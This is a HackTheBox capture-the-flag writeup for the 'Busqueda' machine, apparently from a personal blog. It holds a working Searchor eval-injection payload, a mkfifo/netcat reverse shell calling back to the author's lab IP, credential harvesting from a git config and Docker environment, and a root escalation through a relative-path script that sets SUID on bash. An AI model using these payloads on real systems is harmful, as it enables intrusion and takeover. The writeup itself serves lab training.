---
layout: single
title: Busqueda hackthebox writeup
excerpt: "Easy linux machine in which we exploit a known vulnerability,find plaintext credentials, and abuse a relative path "
date: 2023-04-11
classes: wide
header:
  teaser: /assets/images/busqueda/busqueda_icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - writeup
tags:
  - hackthebox
  - RCE
  - git
  - gitea
  - docker
---

![](/assets/images/busqueda/busqueda.png)

## User Flag

```shell
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Port 80 is open, it redirects to searcher.htb so make sure to add it to your `/etc/hosts`.

The web is a simple "search engine", by scrolling down we can see the software being used.

```
Powered by Flask and Searchor 2.4.0
```

After trying some SSTI just in case, I searched for Searchor 2.4.0 and found its Snyk Page [here](https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303). There isn't any POC available so you need to exploit it manually by yourself by looking at the github pull request.

```python
f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
```

Basically, this line creates a string by calling the method search of the object Engine (then it gets executed by eval), the only injectable parameter here is query since engine is sanitized. knowing it's a string a payload like this does the trick

```python
'+__import__('os').system('ls')+'
```

Now that we have RCE let's just run a reverse shell. The mkfifo payload works fine most of the time.

```python
'+__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.76 7777 >/tmp/f')+'
```

```shell
[dasor@archlinux ~/htb/busqueda]$ nc -lvp 7777
Listening on 0.0.0.0 7777
Connection received on gitea.searcher.htb 45578
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
svc@busqueda:/var/www/app$ ^Z
zsh: suspended  nc -lvp 7777
[dasor@archlinux ~/htb/busqueda]$ stty raw -echo;fg
[1]  + continued  nc -lvp 7777
                              script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@busqueda:/var/www/app$ export TERM=xterm
svc@busqueda:/var/www/app$
```

## Root flag

By looking at the git repository in the app directory we can find plaintext credentials. This lets us execute sudo -l.

```shell
svc@busqueda:/var/www/app/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc:
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Now, we can use docker inspect to get data from the containers

```shell
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {% raw %} '{{json .Config}}' {% endraw %} gitea | tr , '\n'
{"Hostname":"960873171e2e"
"Domainname":""
"User":""
"AttachStdin":false
"AttachStdout":false
"AttachStderr":false
"ExposedPorts":{"22/tcp":{}
"3000/tcp":{}}
"Tty":false
"OpenStdin":false
"StdinOnce":false
"Env":["USER_UID=115"
"USER_GID=121"
"GITEA__database__DB_TYPE=mysql"
"GITEA__database__HOST=db:3306"
"GITEA__database__NAME=gitea"
"GITEA__database__USER=gitea"
"GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
...
```

With this, we now have the admin password for gitea.

If we add gitea.searcher.htb to `/etc/hosts` we can access it. Now, we have access to the source code of all the scripts in the `/opt/scripts` directory.

```python
  elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
```

This part is using a **relative** path so we can just create our own `full-checkup.sh` and run it as root

```shell
svc@busqueda:~$ cat > full-checkup.sh
#!/bin/bash
chmod u+s /bin/bash
^C
svc@busqueda:~$ ls
full-checkup.sh  user.txt
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:~$ bash -p
bash-5.1# whoami
root
```
